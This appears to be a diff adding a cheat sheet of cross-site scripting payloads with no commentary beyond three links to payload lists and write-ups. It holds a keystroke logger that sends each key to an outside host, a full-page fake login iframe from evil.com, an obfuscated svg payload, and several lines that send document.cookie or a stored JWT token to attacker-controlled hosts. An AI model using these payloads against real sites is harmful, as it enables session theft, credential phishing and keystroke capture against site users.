@@ -1,0 +1,44 @@
+<script>
+  window.onload = function() {
+    document.onkeypress = function(e) {
+      new Image().src = "https://google.com/help.php?k=" + e.keyCode;
+    };
+  };
+</script>
+
+<iframe src=javascript:alert(1)>
+<details ontoggle=alert(31337) open>
+<script/src=//6a%2elv></script>
+<img+src=1+onerror=alert(1337)>
+<a href="javascript:alert(1)">Click Me</a> OR <a href="http://evil.com" onevent=XSS >Click Me</a>
+<img src="/" =_=" title="onerror='alert(document.domain)'">
+<p>Xss<!-- --!><img src=1 onerror=alert(`XSS`)>-->Attack</p>
+"/><svg/onload=prompt(1);>
+Xss<!--{cke_protected}--><img src=1 onerror=alert(`xss`)> -->Attack
+<a href="javascript:alert(1)">XSS</a>
+<svg><a xlink:href="javascript:alert(origin)"><text x="40" y="40">Click Here</text></a>
+<img src=x onerror=prompt(domain)>
+<!--><--<img src=x onerror=alert()>-->
+<script>document.write(decodeURI(window.location.search.substr(1).split('=')[1]));</script> 
+
+https://medium.com/@red_darkin/reflected-cross-site-scripting-in-hidden-input-field-0c8bf8fa43f9 
+https://github.com/sh377c0d3/Payloads/blob/master/Cross%20Site%20Scripting/portswigger.txt 
+https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md 
+
+<script>
+	document.write('<iframe id="relogin" style="position:fixed; top:0; left:0;right:0; width:100%; height:100%; border:none; margin:0" src="https://evil.com/fake_login.php"></iframe>');
+</script>
+
+<svg onload=(function(){let arr=[41,49,40,116,114,101,108,97].reverse().map(e=>String.fromCharCode(e));let func=new Function(...arr);func();})()>
+Payload before obfuscation: <svg onload="alert(1)"></svg>
+
+document.location="https://attacker-server?victim_jwt_token"+document.localStorage.getItem("id_token")
+<div onmouseover="new Image().src='http://xx.xxx.xxx.xxx:port/steal.php?c='+escape(document.cookie)>
+<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>
+<script>window.location.replace("http://evil.com");</script> 
+
+
+--save it as sam.svg
+<svg width="200" height="200"
+xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <image xlink:href="https://example.com/image.jpg" height="200" width="200"/> </svg>
+
